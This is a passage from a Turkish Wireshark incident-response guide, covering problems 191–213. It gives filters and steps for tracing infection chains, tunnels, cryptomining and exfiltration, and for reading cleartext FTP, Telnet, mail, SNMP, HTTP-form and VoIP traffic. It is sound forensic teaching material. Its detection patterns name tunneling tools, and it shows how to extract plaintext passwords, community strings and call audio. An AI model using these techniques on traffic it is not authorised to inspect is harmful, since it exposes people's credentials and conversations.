<summary><strong>191 · Zararlı bağlantıyı başlatan ilk olayı bulmak (kill chain başı)</strong></summary>

**Metafor:** Yangının çıktığı ilk kıvılcımı bulmak; alevler sonra geldi.

**Senden istenen:** "Enfeksiyon nasıl başladı? İlk indirme/tıklama hangisi?"

**Filtreler (araştırma yolu):**

- `ip.addr == 203.0.113.50` → C2 IP'sinin tüm trafiği; ilk satır
- `http.request.uri matches "\\.(exe|ps1|hta|js|docm|xlsm|zip)$"` → ilk payload adayları
- `smtp || imf.subject || http.host matches "(mail|webmail|outlook|gmail)"` → e-posta kaynaklı giriş

**Filtreden sonra yol tarifi:**

1. C2 bağlantısından geriye doğru git: bağlantıdan önce ne indirildi?
2. İndirmeden önce ne vardı? Bir e-posta linki, bir web sayfası, bir makro belgesi?
3. İlk kötü niyetli olayı (patient zero event) tespit et ve işaretle.
4. Giriş vektörünü belirle: oltalama e-postası, drive-by indirme, zafiyet istismarı, USB.

**Terimler:**

- **Kill chain**: Saldırının aşamaları (keşif → teslim → istismar → kurulum → C2 → eylem).
- **Initial access**: İlk erişim; saldırının ağdaki başlangıcı.

> **Anlık karar:** C2'yi bulmak sonuçtur; işin değeri onu geriye sarıp ilk kıvılcımı bulmaktır. Vektörü bilmeden kapatamazsın.


</details>

<details>
<summary><strong>192 · İkinci aşama / modül indirmelerini izlemek</strong></summary>

**Metafor:** Casusun ilk çantasından çıkan listeye göre ek ekipmanları tek tek teslim alması.

**Senden istenen:** "Zararlı ilk bağlantıdan sonra ek modüller/araçlar indirdi mi?"

**Filtreler (araştırma yolu):**

- `ip.src == 10.0.0.20 && http.request && frame.time_relative > 0` → kurbanın C2 sonrası istekleri
- `http.response.code == 200 && http.content_length > 50000 && ip.dst == 10.0.0.20` → büyük yük indirmeleri

**Filtreden sonra yol tarifi:**

1. İlk C2 bağlantısından sonraki indirmeleri zaman sırasıyla izle.
2. Her indirmenin boyutunu ve türünü (magic bytes) kaydet.
3. Araç adlarına dair ipuçları ara (mimikatz benzeri, lateral hareket araçları, tarayıcılar).
4. İndirilen her modülü Export Objects ile çıkar ve hash'le.
5. Modüllerin sırası saldırganın hedefini gösterir (kimlik toplama → yanal hareket → sızdırma).

**Terimler:**

- **Second stage**: İlk erişimden sonra indirilen asıl/ek yükler.
- **Module**: Zararlının görev bazlı eklenen bileşenleri.

> **Anlık karar:** Enfeksiyon statik değildir; zaman içinde büyür. İlk yükten sonrasını izlemeden olayın boyutunu bilemezsin.


</details>

<details>
<summary><strong>193 · Tünelleme araçlarını (chisel, ngrok, iodine) tanımak</strong></summary>

**Metafor:** Duvarın arkasına gizli bir boru döşeyip içinden her türlü şeyi geçirmek.

**Senden istenen:** "Trafik gizli bir tünelden mi geçiyor?"

**Filtreler (araştırma yolu):**

- `tls.handshake.extensions_server_name contains "ngrok"` → ngrok tüneli
- `http.request.uri contains "/chisel" || http.upgrade == "websocket"` → chisel websocket tüneli
- `dns.qry.name.len > 50 && dns.qry.type == 16` → iodine/dnscat DNS tüneli
- `websocket && !(ip.dst == 10.0.0.0/8)` → dışa giden websocket tünelleri

**Filtreden sonra yol tarifi:**

1. Bilinen tünel servislerini SNI/host üzerinden ara.
2. WebSocket upgrade istekleri + sürekli ikili veri akışı = websocket tüneli (chisel gibi).
3. DNS tüneli için uzun TXT sorgularına bak (Problem 077).
4. Tünelin uçlarını (iç host, dış sunucu) belirle ve içinden ne geçtiğini (mümkünse) incele.

**Terimler:**

- **Tunneling tool**: Trafiği başka bir protokol/kanal içinden geçiren araç.
- **WebSocket**: HTTP üzerinden kalıcı çift yönlü bağlantı.

> **Anlık karar:** Tünel, "firewall neden bunu engellemedi?" sorusunun cevabıdır. Meşru protokolün (DNS, HTTP, WS) içine gizlenir.


</details>

<details>
<summary><strong>194 · Kripto madenciliği (cryptomining) trafiği</strong></summary>

**Metafor:** Birinin senin elektriğinle kendi madenini çalıştırması; sayaç döner ama fayda ona gider.

**Senden istenen:** "Ele geçirilen makine kripto madenciliği yapıyor mu?"

**Filtreler (araştırma yolu):**

- `tcp.port in {3333, 4444, 5555, 7777, 14444, 45560}` → yaygın madencilik havuzu portları
- `frame contains "stratum"` → Stratum madencilik protokolü
- `frame contains "mining.subscribe" || frame contains "mining.authorize"` → Stratum metotları
- `tls.handshake.extensions_server_name matches "(pool|xmr|monero|miningpool|nanopool|minexmr|supportxmr)"` → madencilik havuzu alanları

**Filtreden sonra yol tarifi:**

1. Stratum protokolü izlerini (mining.subscribe, mining.notify) ara; JSON-RPC formatında düz metin görünebilir.
2. Madencilik havuzu portlarına ve alan adlarına giden bağlantıları listele.
3. Sürekli, düşük hacimli ama kesintisiz bağlantı tipiktir.
4. Kaynak makineyi belirle; madencilik genelde başka bir ele geçirmenin yan ürünüdür, asıl girişi de ara.

**Terimler:**

- **Cryptomining**: Kripto para üretmek için işlemci/GPU kullanma.
- **Stratum**: Madencilik havuzu iletişim protokolü.
- **Mining pool**: Madencilerin güç birleştirdiği havuz.

> **Anlık karar:** "stratum" veya "mining.subscribe" kelimesi trafikte görünüyorsa madencilik neredeyse kesindir.


</details>

<details>
<summary><strong>195 · Fidye/sızdırma sonrası veri boyutunu kanıtlamak</strong></summary>

**Metafor:** Soygundan sonra kasadan tam olarak ne kadar para gittiğini kantar kaydıyla belgelemek.

**Senden istenen:** "Dışarı çıkan toplam veri tam olarak ne kadar? Raporda sayı ver."

**Filtreler (araştırma yolu):**

- `ip.src == 10.0.0.20 && !(ip.dst == 10.0.0.0/8) && tcp.len > 0` → iç hosttan dışa giden uygulama verisi

**Menü / araç:**

- Statistics ▸ Conversations ▸ TCP → şüpheli akışın "Bytes A→B" değeri

**Komut satırı:**

```bash
tshark -r kanit.pcapng -Y 'ip.src == 10.0.0.20 && !(ip.dst == 10.0.0.0/8) && tcp.len > 0' -T fields -e tcp.len | paste -sd+ | bc
```

**Filtreden sonra yol tarifi:**

1. Sadece sızdırma akışlarını kapsayan dar bir filtre yaz.
2. Payload byte'larını (tcp.len) topla; başlıkları ve retransmission'ları dışarıda tutmak için sadece veri taşıyan paketleri al.
3. Birden fazla kanal varsa her birini ayrı hesapla ve topla.
4. Sonucu insan okunur birimle (MB/GB) ve hangi akışlardan geldiğini belirterek raporla.

**Terimler:**

- **Payload byte**: Uygulama verisi; başlıklar hariç.
- **bc**: Komut satırı hesap makinesi.

> **Anlık karar:** "Çok veri gitti" değil, "yaklaşık 340 MB, 3 akışta, 02:14-02:40 UTC arası, 203.0.113.50'ye" de. Sayı rapor demektir.


</details>

<details>
<summary><strong>196 · Komut ve kontrol alanının yaşını ve itibarını değerlendirmek</strong></summary>

**Metafor:** Yeni açılmış, hiç müşterisi olmayan, adresi garip bir dükkân. Yaşı ve geçmişi şüpheyi artırır.

**Senden istenen:** "C2 altyapısı ne kadar yeni/şüpheli?"

**Filtreler (araştırma yolu):**

- `tls.handshake.extensions_server_name` → alanı çıkar, sonra dışarıdan sorgula
- `dns.qry.name` → sorgulanan alan adlarını çıkar

**Filtreden sonra yol tarifi:**

1. Şüpheli alan ve IP'leri pcap'ten çıkar (SNI, DNS, HTTP Host).
2. Bunları analiz ortamı DIŞINDA (zararlıyı tetiklememek için) itibar servislerinde kontrol et: alan kayıt tarihi (WHOIS), VirusTotal, URLhaus, pasif DNS.
3. Çok yeni kayıt (günler önce), ucuz/kötü itibarlı TLD, barındırma geçmişi zararlı IOC'larla eşleşiyorsa şüphe doğrulanır.
4. Bulguyu "alan X gün önce kaydedilmiş, Y servisinde zararlı işaretli" diye belgele.

**Terimler:**

- **WHOIS**: Alan adı kayıt bilgisi (sahip, tarih).
- **Pasif DNS**: Alan-IP çözümlemelerinin geçmiş kaydı.
- **Reputation**: Bir göstergenin bilinen kötülük geçmişi.

> **Anlık karar:** Analiz bilgisayarından zararlı alanı canlı ziyaret etme/sorgulama; hem iz bırakır hem saldırganı uyarır. İtibar sorgusunu izole/pasif kaynaklardan yap.


</details>

<details>
<summary><strong>197 · Enfeksiyon zincirini uçtan uca birleştirmek</strong></summary>

**Metafor:** Dağınık ipuçlarını bir panoya iplerle bağlayıp tüm hikâyeyi tek bakışta görünür kılmak.

**Senden istenen:** "Tüm olayı tek bir anlatıya nasıl bağlarım?"

**Filtreler (araştırma yolu):**

- `ip.addr == 10.0.0.20 && (http.request || dns || tls.handshake.type == 1 || tcp.flags.syn == 1)` → kurbanın tüm "niyet" olayları

**Menü / araç:**

- Statistics ▸ Flow Graph (ilgili filtreyle) → görsel zaman çizgisi

**Filtreden sonra yol tarifi:**

1. Kurban makinenin tüm önemli olaylarını (DNS, indirme, C2, yanal hareket, sızdırma) tek filtreyle topla.
2. Her olayı zaman damgasıyla sırala; bu senin ana anlatı tablondur.
3. Olayları kill chain aşamalarına yerleştir: giriş → kurulum → C2 → keşif → yanal hareket → sızdırma.
4. Boşlukları işaretle (görülmeyen adımlar); uç nokta loglarıyla tamamlanması gerekenleri not et.
5. Flow Graph ile görsel bir özet üret, rapora ekle.

**Terimler:**

- **Kill chain**: Saldırının uçtan uca aşamaları.
- **Narrative**: Kanıtları zamana ve nedene göre bağlayan anlatı.

> **Anlık karar:** Ayrı bulgular rapor değildir. Rapor, bulguları zamanla ve nedenle bağlayan hikâyedir. Zinciri kur, sonra yaz.


</details>

<details>
<summary><strong>198 · Fenomen "spray and pray" indirmeleri: tek makineden çok hedefe</strong></summary>

**Metafor:** Bir kuryenin kısa sürede onlarca farklı adrese uğraması; normal bir çalışanın günlük rotası değildir.

**Senden istenen:** "Bir makine kısa sürede çok sayıda farklı dış hedeften dosya mı çekti?"

**Filtreler (araştırma yolu):**

- `ip.src == 10.0.0.20 && http.request.method == "GET" && !(ip.dst == 10.0.0.0/8)` → dışa giden GET istekleri
- `ip.src == 10.0.0.20 && tls.handshake.type == 1 && !(ip.dst == 10.0.0.0/8)` → dışa açılan TLS bağlantıları

**Filtreden sonra yol tarifi:**

1. Tek kaynaktan dışarıya giden hedeflerin çeşitliliğini say (farklı IP/alan sayısı).
2. Kısa pencerede olağan dışı çok sayıda farklı hedef, otomatik (betik) davranışına işaret eder.
3. Çekilen içeriklerin türünü ve boyutunu kontrol et; birçok küçük betik indirme bir yükleyici zinciri olabilir.
4. Hedefleri IOC listesine ekle, tekrar eden ana alanları grupla.

**Terimler:**

- **Spray**: Tek kaynaktan çok sayıda hedefe hızlı erişim.
- **Automated behavior**: İnsan hızının üstünde, düzenli otomatik davranış.

> **Anlık karar:** İnsan birkaç siteye gider; betik düzinelerce hedefe saniyeler içinde uğrar. Hız ve çeşitlilik ayracındır.


</details>

<details>
<summary><strong>199 · Zararlının "canlılık kontrolü" (connectivity check) istekleri</strong></summary>

**Metafor:** Telefonun şebekesi var mı diye önce bilinen bir numarayı arayıp denemesi.

**Senden istenen:** "Zararlı, internet erişimini doğrulamak için bilinen sitelere mi bağlandı?"

**Filtreler (araştırma yolu):**

- `http.request.uri contains "connectivity-check" || http.request.uri contains "ncsi.txt" || http.request.uri contains "generate_204"` → işletim sistemi bağlantı kontrol uç noktaları
- `http.host matches "(msftconnecttest|msftncsi|connectivitycheck\\.gstatic|detectportal\\.firefox|captive\\.apple)"` → bilinen connectivity check hostları

**Filtreden sonra yol tarifi:**

1. Bu bağlantı kontrol isteklerini filtrele; çoğu meşru işletim sistemi davranışıdır.
2. Zararlılar da ağ erişimini doğrulamak için benzer istekler yapabilir; zamanlamasına ve hangi süreçten geldiğine bak.
3. Enfeksiyonun hemen ardından gelen connectivity check, zararlının C2'ye bağlanmadan önce interneti yoklaması olabilir.
4. Kendi başına kanıt değildir; C2 trafiğiyle aynı pencerede görünürse bağlamı güçlenir.

**Terimler:**

- **Connectivity check**: İnternet erişiminin var olup olmadığını doğrulayan istek.
- **Captive portal detection**: Giriş sayfası var mı kontrolü (işletim sistemlerinin standart davranışı).

> **Anlık karar:** Bu istekler çoğu zaman gürültüdür; ama enfeksiyon anıyla çakışırsa zaman çizelgesinde bir satır değerindedir.


</details>

<details>
<summary><strong>200 · Alan adı oluşturma hızına (yenilik) göre avlanmak</strong></summary>

**Metafor:** Mahalleye her hafta yeni ve tuhaf isimli dükkânların açılması; biri bu desenin dışına çıkınca göze batar.

**Senden istenen:** "Trafikte 'daha önce hiç görülmemiş' alanları nasıl önceliklendiririm?"

**Filtreler (araştırma yolu):**

- `dns.flags.response == 0` → tüm DNS sorguları (ilk görülme analizine kaynak)
- `tls.handshake.extensions_server_name` → TLS hedeflerini de aynı mantıkla çıkar

**Komut satırı:**

```bash
tshark -r kanit.pcapng -Y 'dns.flags.response == 0' -T fields -e frame.time_epoch -e dns.qry.name | sort -k2 | awk '!seen[$2]++{print}'
```

**Filtreden sonra yol tarifi:**

1. Her alan adının pcap içinde ilk göründüğü anı çıkar (awk ile ilk görülme).
2. Kaydın ilerleyen kısımlarında aniden beliren yeni alanları işaretle; olay sırasında ortaya çıkan alanlar şüphelidir.
3. Bunları bilinen kurumsal ve popüler alanlarla karşılaştırıp eleme yap.
4. Kalan "yeni + nadir + garip" alanları, önceki DNS/C2 problemlerindeki tekniklerle derinlemesine incele.

**Terimler:**

- **First seen**: Bir göstergenin ilk gözlemlendiği an.
- **Threat hunting**: Alarm beklemeden proaktif olarak tehdit arama.

> **Anlık karar:** Olay anında "ilk kez beliren" alan, saldırının o sırada kurduğu altyapı olabilir. Yeniliği bir öncelik sinyali olarak kullan.


</details>

## I · Şifresiz Protokoller, E-posta, Dosya Transferi, VoIP ve IoT

*Kilitsiz kapılar. Bu protokoller her şeyi açıkça taşır: parolalar, komutlar, e-postalar, dosyalar, konuşmalar. DFIR'da altın madenidir çünkü içini doğrudan okursun. "Ne çalındı, kim konuştu, hangi parola gitti" sorularının en net cevapları buradadır.*

<details>
<summary><strong>201 · FTP oturumunu ve komutlarını okumak</strong></summary>

**Metafor:** Bir deponun telsiz kayıtları: "giriş yap", "şu klasöre geç", "şu dosyayı indir" talimatlarının hepsi açıkça duyuluyor.

**Senden istenen:** "FTP ile kim giriş yaptı, hangi dosyalar aktarıldı?"

**Filtreler (araştırma yolu):**

- `ftp.request.command == "USER"` → kullanıcı adı
- `ftp.request.command == "PASS"` → parola (düz metin!)
- `ftp.request.command in {"RETR", "STOR"}` → indirme / yükleme komutları
- `ftp.response.code == 230` → başarılı giriş
- `ftp.response.code == 530` → başarısız giriş

**Filtreden sonra yol tarifi:**

1. FTP kontrol kanalını Follow TCP Stream ile aç; tüm komutlar ve cevaplar sırayla okunur.
2. USER ve PASS komutlarından kimlik bilgisini doğrudan oku.
3. RETR (indirme) ve STOR (yükleme) komutlarıyla hangi dosyaların aktarıldığını listele.
4. Veri kanalı ayrı bir bağlantıdır (Problem 202); dosya içeriği oradadır.
5. Başarılı/başarısız giriş kodlarıyla brute force tespiti yap (230 vs 530).

**Terimler:**

- **FTP**: Dosya Aktarım Protokolü (kontrol: TCP 21); şifresizdir.
- **RETR / STOR**: Sunucudan indir / sunucuya yükle.
- **Kontrol kanalı**: Komutların gittiği bağlantı; veri ayrı kanaldan akar.

> **Anlık karar:** FTP'de parola PASS komutunda düz metindir. Follow Stream açtığın an elindedir.


</details>

<details>
<summary><strong>202 · FTP veri kanalından dosya çıkarmak</strong></summary>

**Metafor:** Telsizden "dosya geliyor" dendikten sonra gelen asıl paketi kaydetmek.

**Senden istenen:** "FTP ile aktarılan dosyanın içeriği ne?"

**Filtreler (araştırma yolu):**

- `ftp-data` → FTP veri kanalı trafiği
- `ftp.response.code == 227` → passive mod: veri kanalının portunu bildirir
- `ftp.response.code == 150` → "veri bağlantısı açılıyor"

**Filtreden sonra yol tarifi:**

1. Kontrol kanalında RETR/STOR komutunu ve ardından 150/227 cevabını bul; veri kanalının portu 227 cevabında yazar.
2. ftp-data filtresiyle veri kanalını bul ve Follow TCP Stream ▸ Raw ile içeriği kaydet.
3. Küçük dosyalar metin olarak okunur; ikili dosyaları Raw kaydedip file ile tür belirle.
4. Dosya adını kontrol kanalındaki komuttan al, kaydederken aynı adı kullan.

**Terimler:**

- **FTP-DATA**: Dosya içeriğinin aktığı ayrı kanal (aktif modda port 20).
- **Passive mode**: Sunucunun veri için yeni bir port bildirdiği mod (227 cevabı).

> **Anlık karar:** Dosyayı veri kanalında ara, komutu kontrol kanalında. İkisini stream numaralarıyla eşleştir.


</details>

<details>
<summary><strong>203 · Telnet oturumunu okumak</strong></summary>

**Metafor:** Eski bir radyo hattı; konuşulan her kelime, girilen her şifre havada açıkça dolaşıyor.

**Senden istenen:** "Telnet ile hangi komutlar çalıştırıldı, parola ne?"

**Filtreler (araştırma yolu):**

- `telnet` → tüm Telnet trafiği
- `telnet.data` → Telnet veri (komut/karakter)
- `telnet.data contains "login" || telnet.data contains "Password"` → giriş istemleri

**Filtreden sonra yol tarifi:**

1. Telnet akışını Follow TCP Stream ile aç.
2. Telnet her karakteri ayrı gönderebilir ve sunucu geri yankılar (echo); stream birleştirilmiş halini okunur gösterir.
3. Kullanıcı adı ve parola giriş isteminden sonra düz metin görünür.
4. Çalıştırılan komutları ve çıktılarını sırayla çıkar; bu etkileşimli bir oturumdur.

**Terimler:**

- **Telnet**: Şifresiz uzaktan terminal protokolü (TCP 23).
- **Echo**: Sunucunun yazılan karakteri ekrana geri göndermesi.

> **Anlık karar:** Telnet'te her şey açıktır: parola da, komut da, çıktı da. Follow Stream yeter.


</details>

<details>
<summary><strong>204 · SMTP ile gönderilen e-postayı incelemek</strong></summary>

**Metafor:** Postanenin gönderi kayıtlarını okumak: kim, kime, ne konuyla, hangi ekle gönderdi.

**Senden istenen:** "Hangi e-posta gönderildi, gönderen/alıcı/konu ne, ek var mı?"

**Filtreler (araştırma yolu):**

- `smtp.req.command == "MAIL"` → gönderen adresi (MAIL FROM)
- `smtp.req.command == "RCPT"` → alıcı adresi (RCPT TO)
- `smtp.req.command == "DATA"` → e-posta gövdesinin başlangıcı
- `imf` → Internet Message Format (e-posta başlık ve gövdesi)
- `imf.subject` → e-posta konusu

**Filtreden sonra yol tarifi:**

1. SMTP akışını Follow TCP Stream ile aç; MAIL FROM, RCPT TO ve DATA sonrası tüm e-posta görünür.
2. imf.subject, imf.from, imf.to alanlarını sütun olarak ekleyip e-postaları listele.
3. Ekler base64 kodludur; başlıkta Content-Disposition: attachment; filename="..." satırını bul.
4. Eki çıkarmak için base64 bloğunu kaydedip base64 -d ile çöz, file ile türünü doğrula.

**Terimler:**

- **SMTP**: E-posta gönderme protokolü (TCP 25/587).
- **IMF**: E-postanın başlık+gövde formatı (RFC 822/5322).
- **MAIL FROM / RCPT TO**: Zarf üzerindeki gerçek gönderen/alıcı.

> **Anlık karar:** Zarf (MAIL FROM) ile başlıktaki From farklı olabilir; sahtecilikte ikisini karşılaştır.


</details>

<details>
<summary><strong>205 · POP3/IMAP ile okunan e-postalar ve kimlik bilgileri</strong></summary>

**Metafor:** Birinin posta kutusunu açıp içindeki mektupları tek tek okuması; anahtar da açıkça masada.

**Senden istenen:** "E-posta hesabına şifresiz erişim var mı, hangi mesajlar okundu?"

**Filtreler (araştırma yolu):**

- `pop.request.command == "USER" || pop.request.command == "PASS"` → POP3 kimlik bilgisi
- `imap.request contains "LOGIN"` → IMAP giriş komutu
- `pop.request.command == "RETR"` → POP3 ile mesaj indirme
- `imap.request contains "FETCH"` → IMAP ile mesaj çekme

**Filtreden sonra yol tarifi:**

1. POP3/IMAP akışını Follow Stream ile aç; USER/PASS veya LOGIN komutlarında kimlik bilgisi düz metindir.
2. RETR (POP3) ve FETCH (IMAP) komutlarıyla hangi mesajların indirildiğini say.
3. İndirilen mesaj içeriklerini stream'den oku; ekleri base64'ten çöz.
4. Şifreli varyantlar (POP3S 995, IMAPS 993) içeriği gizler; o zaman sadece bağlantı meta verisi kalır.

**Terimler:**

- **POP3 / IMAP**: E-posta alma protokolleri (110 / 143; şifreli 995 / 993).
- **RETR / FETCH**: Mesaj indirme komutları.

> **Anlık karar:** 110/143 portu = şifresiz = içerik ve parola açık. 995/993 = şifreli. Önce porta bak.


</details>

<details>
<summary><strong>206 · Oltalama (phishing) e-postası ve zararlı ek/link</strong></summary>

**Metafor:** Postadan gelen, resmî görünen ama içinde tuzak olan bir mektup: ya zehirli bir ek ya sahte bir adrese götüren link.

**Senden istenen:** "Oltalama e-postası var mı, zararlı ek/link hangisi?"

**Filtreler (araştırma yolu):**

- `imf` → e-posta içeriği
- `imf.subject matches "(invoice|payment|urgent|verify|account|suspended|fatura|acil|ödeme|kargo)"` → yaygın oltalama konuları
- `mime_multipart.header.content-disposition contains "attachment"` → ekli mesaj parçaları
- `frame matches "filename=.*\\.(exe|scr|js|vbs|hta|docm|xlsm|zip|iso|img|lnk)"` → şüpheli ek dosya adı uzantıları

**Filtreden sonra yol tarifi:**

1. E-postaları listele; konu, gönderen ve ekleri incele.
2. Eki çıkar (base64 çöz) ve türünü/hash'ini belirle; makro belgesi veya çalıştırılabilir mi?
3. Gövdedeki linkleri çıkar; görünen metin ile gerçek URL farklı mı (gizlenmiş link)?
4. Kullanıcının bu linke tıklayıp tıklamadığını sonraki HTTP/DNS trafiğinde ara (Problem 085).
5. Giriş vektörü olarak zaman çizelgesinin başına koy.

**Terimler:**

- **Phishing**: Kullanıcıyı kandırıp bilgi/erişim elde etme.
- **Content-Disposition: attachment**: Mesajdaki ek bildirimi.

> **Anlık karar:** Oltalama genelde kill chain'in başıdır. E-postayı bulduysan "sonra kim tıkladı?" sorusuyla zinciri ileri sar.


</details>

<details>
<summary><strong>207 · SMTP/e-posta ile veri sızdırma</strong></summary>

**Metafor:** Çalınan belgeleri sıradan mektuplara ek yapıp dışarı yollamak.

**Senden istenen:** "İç ağdan dışarıya e-posta ile veri mi kaçırıldı?"

**Filtreler (araştırma yolu):**

- `smtp.req.command == "RCPT" && smtp.req.parameter contains "@"` → alıcı adresleri
- `smtp && ip.src == 10.0.0.0/8 && !(ip.dst == 10.0.0.0/8)` → iç ağdan dışa SMTP
- `mime_multipart.header.content-disposition contains "attachment"` → ekli giden mesaj parçaları

**Filtreden sonra yol tarifi:**

1. Dışarıya giden SMTP trafiğini filtrele; alıcı adreslerini (RCPT TO) listele.
2. Kurumsal olmayan alıcılara (kişisel e-posta, bilinmeyen alan) giden ekli mesajları işaretle.
3. Ek boyutlarını ve türlerini kontrol et; büyük arşivler/belgeler sızdırma adayıdır.
4. Gönderen hesabı ve zamanı (mesai dışı mı?) raporla.

**Terimler:**

- **Exfiltration via email**: E-posta ekiyle veri kaçırma.
- **Zarf alıcısı**: RCPT TO'daki gerçek teslim adresi.

> **Anlık karar:** İç kullanıcının mesai dışı, kişisel adrese, büyük ek gönderdiği e-posta her zaman incelenir.


</details>

<details>
<summary><strong>208 · TFTP ile dosya transferi (ağ cihazı yapılandırmaları)</strong></summary>

**Metafor:** Kapıda bekçi olmadan dosya alıp veren bir self-servis dolap; kim ne aldığını kimse sormaz.

**Senden istenen:** "TFTP ile hangi dosyalar (genelde cihaz config/firmware) aktarıldı?"

**Filtreler (araştırma yolu):**

- `tftp` → TFTP trafiği
- `tftp.opcode == 1` → Read Request (dosya okuma)
- `tftp.opcode == 2` → Write Request (dosya yazma)
- `tftp.source_file || tftp.destination_file` → aktarılan dosya adları

**Filtreden sonra yol tarifi:**

1. TFTP isteklerini filtrele; okunan/yazılan dosya adlarını oku.
2. Ağ cihazı yapılandırmaları (running-config, startup-config) veya firmware aktarımı güvenlik açısından önemlidir.
3. Follow UDP Stream ile dosya içeriğini kaydet.
4. TFTP kimlik doğrulaması yoktur; kimin aktardığını IP'den çıkar ve yetkisiz erişim olup olmadığını değerlendir.

**Terimler:**

- **TFTP**: Basit Dosya Aktarım Protokolü (UDP 69); kimlik doğrulaması yoktur.
- **running-config**: Ağ cihazının aktif yapılandırması.

> **Anlık karar:** TFTP ile config indirilmesi, ağ cihazı bilgisinin sızdığı anlamına gelir. İçeriğinde parola/SNMP community olabilir.


</details>

<details>
<summary><strong>209 · SNMP ile cihaz bilgisi ve community string</strong></summary>

**Metafor:** Bir binanın tüm sayaçlarını ve ayarlarını, kapıda söylenen basit bir parolayla okuyup değiştirebilmek.

**Senden istenen:** "SNMP ile bilgi toplanmış mı, community string ne, ayar değiştirilmiş mi?"

**Filtreler (araştırma yolu):**

- `snmp` → SNMP trafiği
- `snmp.community` → community string (SNMP'nin "parolası", düz metin)
- `snmp.community == "public" || snmp.community == "private"` → varsayılan community'ler

**Filtreden sonra yol tarifi:**

1. SNMP paketlerini filtrele; community string düz metindir (public/private varsayılanları zayıftır).
2. GET istekleri bilgi toplar (keşif), SET istekleri ayar değiştirir (saldırı); PDU türüne bak.
3. Çok sayıda GET = cihaz bilgisi tarama (snmpwalk); hedef OID'leri incele.
4. SET görürsen hangi değerin değiştirildiğini oku; yapılandırma manipülasyonudur.

**Terimler:**

- **SNMP**: Ağ cihazı izleme/yönetim protokolü (UDP 161/162).
- **Community string**: SNMP v1/v2c'nin düz metin erişim parolası.
- **OID**: Yönetilen bir değerin ağaç içindeki adresi.

> **Anlık karar:** "public" community ile erişim = kimlik doğrulaması yok gibi. SNMP SET görürsen cihaz ayarı değiştirilmiştir.


</details>

<details>
<summary><strong>210 · Düz metin HTTP formlarında parola yakalamak</strong></summary>

**Metafor:** Doldurulan formun bir kopyasının açık kartpostalla gönderilmesi.

**Senden istenen:** "Şifresiz HTTP üzerinden parola gönderilmiş mi?"

**Filtreler (araştırma yolu):**

- `http.request.method == "POST" && urlencoded-form.key matches "(pass|pwd|password|pw)"` → parola alanı içeren formlar
- `urlencoded-form.value` → form değerleri (parola dahil)
- `http.authbasic` → HTTP Basic Auth kimlik bilgileri

**Menü / araç:**

- Tools ▸ Credentials → otomatik toplanan düz metin kimlik bilgileri

**Filtreden sonra yol tarifi:**

1. Parola alanı içeren POST formlarını bul; urlencoded-form.key ve .value sütunlarını ekle.
2. Follow HTTP Stream ile form gövdesini oku; alan=değer çiftleri açıkça görünür.
3. Tools ▸ Credentials penceresiyle Wireshark'ın otomatik topladıklarını kontrol et.
4. Şifresiz giriş başlı başına bir zafiyettir; raporda "kimlik bilgisi düz metin HTTP ile iletildi" diye belirt.

**Terimler:**

- **urlencoded-form**: HTML form verisinin URL kodlu gönderim formatı.
- **Credentials penceresi**: Wireshark'ın kimlik bilgilerini topladığı araç.

> **Anlık karar:** HTTP (443 değil 80) + parola alanı = parola ağda açık. CTF ve gerçek vakada en kolay "flag/parola" bulma yeridir.


</details>

<details>
<summary><strong>211 · VoIP/SIP çağrılarını analiz etmek (kim kimi aradı)</strong></summary>

**Metafor:** Bir santralin arama kayıtları: hangi numara hangi numarayı aradı, ne zaman, ne kadar sürdü.

**Senden istenen:** "SIP üzerinden kim kimi aradı, çağrı kuruldu mu?"

**Filtreler (araştırma yolu):**

- `sip` → SIP sinyalleşme trafiği
- `sip.Method == "INVITE"` → çağrı başlatma
- `sip.Method == "BYE"` → çağrı sonlandırma
- `sip.Status-Code == 200` → başarılı cevap

**Menü / araç:**

- Telephony ▸ VoIP Calls → tüm çağrıların listesi (arayan, aranan, süre, durum)
- Telephony ▸ SIP Flows → çağrı kurulum akışı

**Filtreden sonra yol tarifi:**

1. Telephony ▸ VoIP Calls ile çağrıları tek listede gör: From, To, başlangıç, süre, durum.
2. INVITE'tan arayan/aranan (sip.from.user, sip.to.user) bilgisini çıkar.
3. 200 OK + ACK = çağrı kuruldu; sadece INVITE + hata = kurulamadı.
4. SIP kimlik bilgileri (REGISTER, Authorization) düz metin veya zayıf olabilir; kayıt dolandırıcılığı (toll fraud) belirtisi ara.

**Terimler:**

- **SIP**: VoIP çağrı sinyalleşme protokolü (UDP/TCP 5060).
- **INVITE / BYE**: Çağrı başlat / bitir.
- **RTP**: Asıl ses verisini taşıyan protokol (ayrı akış).

> **Anlık karar:** SIP "kim kimi aradı"yı, RTP "ne konuşuldu"yu taşır. Önce VoIP Calls penceresine bak.


</details>

<details>
<summary><strong>212 · RTP ses akışını çıkarıp dinlemek</strong></summary>

**Metafor:** Arama kaydının sadece defterini değil, ses kaydını da dinlemek.

**Senden istenen:** "VoIP görüşmesinin içeriğini (sesi) çıkarabilir miyim?"

**Filtreler (araştırma yolu):**

- `rtp` → RTP ses/görüntü akışı
- `rtp.p_type == 0 || rtp.p_type == 8` → G.711 (ulaw/alaw) sık kodekler

**Menü / araç:**

- Telephony ▸ VoIP Calls → çağrı seç ▸ Play Streams → sesi çal / kaydet
- Telephony ▸ RTP ▸ RTP Streams → akışları listele ve analiz et

**Filtreden sonra yol tarifi:**

1. Telephony ▸ VoIP Calls'tan çağrıyı seç ve "Play Streams" ile dinle (standart kodekler desteklenir).
2. Kodek desteklenmiyorsa RTP yükünü dışa aktarıp harici araçla çöz.
3. DTMF tonları (tuş sesleri) rtp-event olarak görünür; girilen numara/PIN'ler olabilir (Problem 215 mantığı).
4. Çağrının tarafları ve içeriğini birleştirip rapora ekle.

**Terimler:**

- **RTP**: Gerçek zamanlı taşıma protokolü; ses/görüntü taşır.
- **Codec**: Sesin sayısallaştırma/sıkıştırma biçimi (G.711, G.729).
- **DTMF**: Tuş tonları.

> **Anlık karar:** Şifresiz VoIP'te ses tamamen çıkarılabilir. Play Streams düğmesi bunu bir tıkla yapar.


</details>

<details>
<summary><strong>213 · MQTT ve IoT mesajlaşma trafiği</strong></summary>

**Metafor:** Akıllı cihazların kısa, basit mesajlarla haberleştiği bir ilan panosu; çoğu zaman kilit yok.

**Senden istenen:** "IoT cihazları ne konuşuyor, kimlik bilgisi/komut açık mı?"

**Filtreler (araştırma yolu):**

- `mqtt` → MQTT trafiği
- `mqtt.msgtype == 1` → CONNECT (bağlanma, kimlik bilgisi içerir)
- `mqtt.username || mqtt.passwd` → MQTT kimlik bilgileri (düz metin olabilir)
- `mqtt.topic` → mesaj konuları
- `mqtt.msg` → mesaj içeriği

